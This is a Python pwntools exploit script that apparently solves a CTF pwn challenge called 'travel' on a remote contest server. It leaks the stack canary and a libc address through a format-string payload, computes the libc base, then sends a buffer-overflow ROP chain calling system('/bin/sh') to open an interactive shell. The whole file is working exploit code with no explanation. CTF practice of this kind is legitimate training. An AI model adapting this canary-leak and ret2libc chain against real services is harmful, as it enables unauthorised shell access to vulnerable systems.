from pwn import *

r = remote("01.linux.challenges.ctf.thefewchosen.com", 60888)
# r = process("./travel")
# gdb.attach(r, api=True)

print(r.recvuntil(b"go?"))

ret_gadget = 0x0000000000029cd6
pop_rdi_ret = 0x000000000002a3e5
libstartmain_off = 0x0000000000029dc0
binsh = 0x1d8698
system = 0x0000000000050d60

payload = b"%53$p-%55$p"
r.sendline(payload)

output = r.recvuntil(b"go?")
print(output)
addrs = output.split(b" is an ")[0][-33:]
print(addrs)
canary = int(addrs.split(b"-")[0], 16)
print(hex(canary))
libcstart128 = int(addrs.split(b"-")[1], 16)
print(hex(libcstart128))
libcbase = libcstart128 - 128 - libstartmain_off 
print(hex(libcbase))

payload = b"a"*200 + p64(canary) + p64(0) + p64(libcbase + ret_gadget) + p64(libcbase + pop_rdi_ret) + p64(libcbase + binsh) + p64(libcbase + system)
r.sendline(payload)

r.interactive()